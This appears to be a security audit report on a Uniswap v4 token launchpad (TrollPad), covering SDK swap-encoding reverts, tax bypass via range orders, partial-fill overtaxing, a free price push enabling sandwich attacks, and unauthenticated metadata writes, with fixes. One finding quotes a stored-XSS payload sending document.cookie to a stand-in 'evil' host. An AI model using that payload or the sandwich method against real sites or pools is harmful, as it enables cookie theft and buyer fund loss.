### [medium] `gap1-infra-provenance-1` — SDK (trollpad-sdk) still sends the old 5-field swap struct, so every SDK buy and sell reverts on the live router

Category: integration-mismatch · reported medium → verified medium · found by: gap:infra-provenance, gap:live-e2e-sim, gap:sdk-indexer

**Status:** Fixed (8e81d3f): SDK uses the 6-field struct; adds quoteBuy/quoteSell and a zero-min guard.

**Where:** `sdk/src/swap.ts:35-44`, `sdk/dist/swap.js:33-35`, `sdk/src/client.ts:92-108`, `troll-pad-web/app/docs/page.tsx:144-185`, `sdk/src/client.ts:92-109`, `troll-pad-web/app/docs/page.tsx:144-163`, `sdk/README.md:43-53`, `troll-pad-web/lib/swap.ts:38-53` (+6 more)

**What:** The web app's lib/swap.ts was fixed to send the 6-field ExactInputSingleParams that the live Universal Router (canonical Uniswap UR v2.1.1) expects: (PoolKey, bool, uint128 amountIn, uint128 amountOutMinimum, uint256 minHopPriceX36, bytes hookData). The SDK's buildExactInSwap, in both src and the built dist, still sends the 5-field shape without the extra word. The router reads the offset of hookData from the wrong slot and reverts with no data. buildBuy and buildSell both go through this function, and the public /docs page tells bot builders to use the SDK (and to read sdk/src/swap.ts if they encode the call themselves). So the documented bot or integrator trade path does not work at all.

**Scenario:** A bot calls client.buildBuy({token: PETTY, amountIn: 1_000000n, amountOutMin: 0n}) and sends it. The transaction reverts every time and the bot pays gas for nothing. I reproduced this with a read-only eth_call against the testnet router, using the real SDK build (sdk/dist/swap.js) on the live PETTY pool: bare 'execute reverted', no revert data. With the same inputs, the 6-field encoding gets past the swap and fails later with CurrencyNotSettled (0x5212cba1) in a swap-only replay, which shows the swap itself ran.

**Impact:** The whole programmatic trading flow (SDK and anyone copying sdk/src/swap.ts per the docs) is broken for all users. No funds are lost except gas, but bots and integrators cannot trade, and anyone copying the documented encoding hits the same revert.

**Suggested fix:** Share one encoder between the web app and the SDK, or copy the fixed web encoder into the SDK. Add the 5th field as `uint256 minHopPriceX36` (see the next finding for the correct name) set to 0n, rebuild dist, and add a CI eth_call smoke test that runs a swap-only execute against the live router and expects CurrencyNotSettled instead of an empty revert.

**Also reported as:** [gap2-live-e2e-sim-1] trollpad-sdk swap builder still uses the old SWAP_EXACT_IN_SINGLE layout (no sqrtPriceLimitX96), so every SDK buy and sell reverts on the live Arc router; [gap3-sdk-indexer-1] SDK buildBuy/buildSell still use the 5-field swap params, so every SDK trade reverts on the live Arc Universal Router. The public docs page tells bots to use this SDK

### [medium] `hook-1` — Buy/sell tax can be bypassed entirely by trading through liquidity positions (range orders), since the hook does not gate addLiquidity

Category: economic / tax bypass · reported medium → verified medium · found by: hook, tests-spec, economic-mev, locker

**Status:** Fixed in source, not deployed: BEFORE_ADD_LIQUIDITY gate so only the registered locker can add (flags 0x28CC); the portal registers before seeding. test_ThirdPartyRangeOrderIsRejected.

**Where:** `launchpad/src/TrollHook.sol:57-59`, `launchpad/src/TrollHook.sol:268-274`, `launchpad/src/TrollHook.sol:326-384`, `launchpad/script/DeployTrollPad.s.sol:77-80`, `launchpad/README.md:89-102`, `launchpad/src/TrollHook.sol:25-40`, `launchpad/src/TrollHook.sol:268-305`, `launchpad/lib/v4-core/src/libraries/Hooks.sol:194-205` (+1 more)

**What:** Tax is only charged in beforeSwap/afterSwap. The hook's flag set (0x20CC) does not include BEFORE_ADD_LIQUIDITY, so anyone can add or remove liquidity on any Troll pool through the PoolManager or PositionManager. A holder who wants to sell can place a token-only position just past the current price, which is a limit order. Other people's buys push the price through it and turn the tokens into USDC, and the holder then removes the position. No swap by the holder ever happens, so no sell tax is charged, and the holder also earns the 1% LP fee. Buying works the same way: a USDC-only position on the other side of the price gets filled by sellers with no buy tax. The creator/platform tax, the core revenue source of the design, can therefore be avoided by any holder willing to use a limit order.

**Scenario:** PoC hunt-hook-1, test_rangeOrderBypassesSellTax, run in both orientations (token as currency0 and as currency1), 3%/7% taxes. The trader buys with 50k USDC, then adds liquidity L=1e20 over [tick+200, tick+2200] (or the mirrored range), putting 402,045,668 tokens in. buyer2 buys with 200k USDC and pays 6,000 USDC of buy tax. The trader removes the position and gets 189,400.62 USDC plus 91.9M tokens back. Output: 'sell tax charged to trader 0'. Selling the same ~310M tokens with a normal swap would have cost 7% of proceeds, about 13-14k USDC, in sell tax.

**Impact:** Creator (90%/85%) and platform (10%/15%) tax revenue can be avoided by any informed holder or bot, with no cost beyond waiting for the order to fill. Third parties can also put their positions in front of the locked LP and take the LP fees that the design routes to the splitter.

**Suggested fix:** Add BEFORE_ADD_LIQUIDITY to the flags. Store the launch's locker in PoolConfig during registerPool (the portal knows r.locker), and in beforeAddLiquidity revert unless sender == cfg.locker, or unless the pool is not yet registered, because seedLiquidity runs before registerPool in TrollPortal._seedLaunchPool. This changes the flag set to 0x28CC, so the hook has to be re-mined and TrollHook plus every portal redeployed. Also document that trading through untaxed pools on other venues cannot be prevented, because the token is a plain ERC-20.

**Also reported as:** [tests-spec-2] Buy/sell tax can be fully bypassed with range orders because adding liquidity is not restricted; [locker-1] Anyone can add liquidity to launch pools, so outside or just-in-time LPs can take part of the LP-fee revenue meant for the locker (creator and platform); [economic-mev-5] Liquidity changes on the official pool are not gated

### [medium] `hook-2` — Tax on the quote-specified leg is computed on the requested amount, not the filled amount, so partial fills (price limit hit) are heavily overcharged

Category: accounting / user fund loss · reported medium → verified medium · found by: hook, tests-spec

**Status:** Fixed in source, not deployed: afterSwap requires a full fill when tax was charged on the specified leg (PartialFillUnsupported). test_PartialFillOfTaxedExactInBuyReverts.

**Where:** `launchpad/src/TrollHook.sol:345-351`, `launchpad/lib/v4-core/src/libraries/Hooks.sol:269-278`, `launchpad/lib/v4-core/src/PoolManager.sol:204-224`, `launchpad/src/TrollHook.sol:326-352`, `launchpad/lib/v4-core/src/libraries/Hooks.sol:272-277`, `launchpad/lib/v4-core/src/libraries/Hooks.sol:304-312`

**What:** For exact-input buys and exact-output sells, beforeSwap charges taxAmount = |amountSpecified| * taxBps / 1e4 before the swap runs and returns it as the specified-side delta. If the swap stops early because sqrtPriceLimitX96 is reached (or it runs out of liquidity), the pool fills only part of the order, but the full tax is still minted and charged. The caller pays the partial fill plus tax on the whole requested amount. afterSwap never checks the realized delta for this branch (it returns early at line 371). In vanilla v4 an unfilled exact-input amount is simply not charged; here the unfilled part is taxed as if it had traded.

**Scenario:** PoC test_exactInBuy_priceLimit_overtax, both orientations: an exact-input buy of 100,000 USDC with the price limit two tick-spacings from the current tick. Output: 'paid total 3103987565', 'tax 3000000000', 'into pool 103987565', 'effective tax bps on filled 288496'. The trader paid 3,000 USDC of tax on a fill of 104 USDC, about 2,885% effective. Arc's Universal Router exposes sqrtPriceLimitX96 in SWAP_EXACT_IN_SINGLE, so any bot or integrator that uses the price limit as slippage protection with a loose amountOutMinimum is exposed. A creator (who receives 85-90% of the tax) can force the partial fill by front-running such a buy up to its limit. Exact-output sells have the same flaw: a request for 950 USDC against about 970 USDC of depth delivered 893.8 USDC while charging tax on the full 950 (test_exactOutSell_partialFill_overtax).

**Impact:** Swappers who use price limits lose tax on the unfilled part of their order, up to taxBps x (requested - filled), which can be many times the value actually traded. The creator gains it, and the creator can trigger it.

**Suggested fix:** In afterSwap, when quote was the specified leg (the branch that currently returns 0 at line 371), recompute the specified tax and require a full fill. For exact input, |delta.quote| == specifiedAbs - taxAmount; for exact output, |delta.quote| == specifiedAbs + taxAmount. Otherwise revert PartialFillUnsupported(). The frontend's sqrtPriceLimitX96 = 0 path always fills in full, so it is unaffected.

**Also reported as:** [tests-spec-1] Hook charges tax on the requested amount, not the executed amount, so partial fills are over-taxed (up to 100x the executed trade)

### [medium] `portal-1` — Anyone can push a fresh launch's price to the extreme for free; the UI then sends buys with amountOutMin = 0, and a sandwich takes about 98% of the buy

Category: economic-exploit / integration · reported high → verified medium · found by: portal, tests-spec

**Status:** UI side fixed and deployed (706d84e). Contract side fixed in source, not deployed: afterSwap reverts on a zero-fill swap (NoLiquidityToFill), and the pool opens at the position edge. test_OpensAtEdgeAndBlocksFreePush_*.

**Where:** `launchpad/src/TrollPortal.sol:231-258`, `launchpad/src/TrollPortal.sol:216`, `launchpad/lib/v4-core/src/libraries/Pool.sol:319-338`, `troll-pad-web/lib/pool.ts:46-51`, `troll-pad-web/lib/data.ts:112-116`, `troll-pad-web/components/TradePanel.tsx:50-59`, `troll-pad-web/lib/format.ts:29-33`, `troll-pad-web/lib/swap.ts:53` (+3 more)

**What:** _seedLaunchPool puts 100% of the supply on one side of the price. For token0 the range is [floor+200, 887200]. For token1 it is [-887200, floor]. The pool also opens inside an empty gap. So from launch until the first buy, the sell side of the price holds zero liquidity. In v4 a swap across zero liquidity moves sqrtPrice all the way to the caller's limit with amountIn = amountOut = 0 (Pool.swap loop / SwapMath with liquidity 0). The hook taxes 0. Anyone can therefore move slot0 to MIN_SQRT_PRICE+1 (token0) or MAX_SQRT_PRICE-1 (token1) with no tokens and no USDC, at gas cost only, and can repeat it. The frontend reads spot price straight from slot0 (fetchSpot → priceFromSqrt), so MC then shows about $0. TradePanel's estimateOut divides by that price and returns about 3.3e28 tokens for a $100 buy. `min.toFixed(18)` on a number of 1e21 or more returns exponent notation ('3.2e+28'). parseUnitsSafe's regex rejects it and returns null, and `?? 0n` turns amountOutMin into 0. The swap also uses sqrtPriceLimitX96 = 0. The victim's buy is sent with no slippage protection at all.

**Scenario:** 1) The attacker, holding 0 token and 0 USDC, does an exact-in 'sell' of 1e24 tokens on a fresh launch. The pool moves to tick -887272 (token0) or 887271 (token1), and the attacker's balances stay at 0. 2) Any visitor now sees MC ≈ $0, and their buy goes out with amountOutMin = 0. 3) The attacker front-runs with a $5,000 buy, the victim's $500 buy fills, and the attacker sells back. Measured on a $500-MC launch: the victim gets 7.65e24 tokens instead of 4.97e26 (a 98.46% loss). Attacker profit is +$436.48 with 0% tax and +$114.85 with 3%/3% tax. The free window lasts until the first real buy (PETTY has sat at its initial price for about 276k blocks). It reopens whenever buyers have fully sold back out of the pool.

**Impact:** Direct loss of most of a buyer's USDC on any not-yet-bought launch, in both token orderings. Price and MC display can be manipulated for free on every fresh launch. How often this happens depends on an attacker being able to order transactions around the victim's (mempool visibility on Arc). The zero-cost setup makes it easy.

**Suggested fix:** Contract: in TrollHook.afterSwap, revert when the swap's BalanceDelta is (0,0) (a no-op swap that only moved the price). This removes the free price push, because nothing can fill on the empty side. Also apply the edge-initialization fix from the related finding. Frontend: quote with the v4 Quoter (or a simulated swap) instead of slot0. Never let amountOutMin fall back to 0: throw if parsing fails, and use bigint math instead of toFixed. Set a real sqrtPriceLimitX96. Clamp the displayed price to the launch's position edge using the tickLower/tickUpper from LaunchCreated.

**Also reported as:** [tests-spec-4] Anyone can push a fresh launch's slot0 to MIN_SQRT_PRICE for free, breaking UI price/MC and blocking all UI buys

### [medium] `splitter-treasury-1` — The web app has no way to flush swap tax, so creators always see 0 claimable USDC

Category: integration / broken user flow · reported medium → verified medium · found by: economic-mev, web-trade, splitter-treasury

**Status:** Fixed: the creator card shows tax waiting in the hook and has a permissionless "Flush tax" button (hook.flush(key)).

**Where:** `troll-pad-web/components/TokenExtras.tsx:52-106`, `troll-pad-web/lib/abi.ts:26`, `launchpad/src/TrollHook.sol:225-237`, `troll-pad-web/components/TokenExtras.tsx:55-61`, `troll-pad-web/components/TokenExtras.tsx:85-99`, `troll-pad-web/lib/abi.ts:25-26`, `troll-pad-web/components/TokenExtras.tsx:52-61`, `troll-pad-web/components/TokenExtras.tsx:84-106` (+1 more)

**What:** Swap tax builds up in TrollHook.pendingTax[poolId] as ERC-6909 claims. It only becomes creditedToCreator or creditedToPlatform when someone calls the permissionless hook.flush(key). The CreatorCard shows only splitter.creditedToCreator(USDC) and offers only Claim and Harvest buttons. Nothing in troll-pad-web, bot, indexer or sdk calls flush or displays pendingTax (grep finds only the ABI entries in lib/abi.ts and sdk/src/abi.ts). PROJECT_NOTES says the platform runs no keeper. The docs page promises tax is 'claimable via the splitter contract at any time', which is only true after someone flushes.

**Scenario:** A creator launches with 3%/3% tax and their token does $10,000 of volume. The hook holds about $300 in pendingTax. The creator's page shows 'Claimable USDC 0.0000', and the Claim USDC button is disabled because usdc === 0n. Harvest Fees only collects LP fees, not tax. **Impact:** No funds are lost; flush is permissionless. But the main way creators get paid does not work from the UI for every launch, and the displayed claimable balance is understated by the entire unflushed tax. The platform's own share also never reaches the treasury unless someone flushes by hand.

**Suggested fix:** In CreatorCard: read hook.pendingTax(launch.poolId) and show it as 'pending (unflushed) tax: 90% to you', and add a 'Flush tax' button that calls hook.flush(key), building the key from launch.token, CONFIG.usdc, fee 10000, tickSpacing 200 and CONFIG.hook in tokenIsToken0 order. Or add a batched 'Collect & claim' flow. Optionally have the indexer or bot flush on a schedule. Correct the docs page wording.

**Also reported as:** [economic-mev-7] No flush path anywhere; [web-trade-4] No UI calls TrollHook.flush, so swap-tax revenue never reaches the creator's claimable balance

### [medium] `web-backend-1` — Unauthenticated metadata write/overwrite: anyone can hijack any token page (image, description, social links) to phish buyers

Category: access-control · reported high → verified medium · found by: web-backend, economic-mev, web-trade

**Status:** Fixed (706d84e): creator-signed writes (EIP-191, live splitter.creator()), replay window, validation.

**Where:** `troll-pad-web/app/api/metadata/[token]/route.ts:50-90`, `troll-pad-web/lib/db.ts:61-72`, `troll-pad-web/lib/metadata.ts:55-63`, `troll-pad-web/app/token/[address]/page.tsx:98-115`, `troll-pad-web/app/create/page.tsx:87-90`, `troll-pad-web/app/api/metadata/[token]/route.ts:247-286`, `troll-pad-web/lib/db.ts:63-67`, `troll-pad-web/app/token/[address]/page.tsx:98-116` (+1 more)

**What:** POST /api/metadata/{token} checks nothing except that the path is an address. It has no wallet signature, no check against the on-chain creator (the splitter's creator() or the LaunchCreated creator), no nonce, no session and no rate limit. upsertTokenMeta then does ON CONFLICT (token) DO UPDATE and overwrites name, description, image_key, links and split, so the last writer wins permanently. The token page renders meta.image as the token avatar, meta.description directly under the on-chain name, and meta.links.x/website/telegram as clickable icons beside 'Created by <creator>'. The legit create flow never sends links (saveMeta sends links = m.links ?? {} and create/page.tsx never sets links). ### [info] `web-backend-2` — Social link URLs are stored and rendered without scheme validation (javascript:/data: survive React 18.3.1)

Category: xss · reported low → verified info · found by: web-backend

**Status:** Fixed (706d84e): https-only, host-checked links on write; re-checked on render.

**Where:** `troll-pad-web/app/api/metadata/[token]/route.ts:62`, `troll-pad-web/app/api/metadata/[token]/route.ts:85`, `troll-pad-web/app/token/[address]/page.tsx:113-115`

**What:** links is JSON.parse'd and stored verbatim, with no type or scheme checks. The token page puts it straight into <a href>. React 18.3.1 only logs a dev warning for javascript: URLs; it does not strip them in production. Blocking arrived only in React 19. The values can also be non-strings (objects, arrays). In modern browsers, target="_blank" plus rel="noreferrer" (which implies noopener) means a click opens a new opaque-origin context, so script execution in the trollpad.co origin is not expected. Browsers also block top-level data: navigation. The XSS primitive is therefore present but one refactor away from executing (for example, dropping target or rendering links elsewhere).

**Scenario:** The attacker posts links={"x":"javascript:fetch('https://evil/?'+document.cookie)"}. React renders <a href="javascript:fetch(…)" target="_blank">. If a future change removes target=_blank or reuses the link in a same-tab context, the script runs in the trollpad.co origin, where it can rewrite the trade panel or intercept wallet requests.

**Impact:** Latent stored XSS on the token page. Today it is mostly mitigated by the link attributes, so the practical risk now is phishing via https links (see the previous finding).

**Suggested fix:** On the server: require typeof === 'string', require new URL(v).protocol === 'https:', and cap the length (for example 200). Pin each field to its expected host (x.com/twitter.com, t.me) and allow any https host only for website. Validate again at render time, and upgrade to React 19 when feasible.
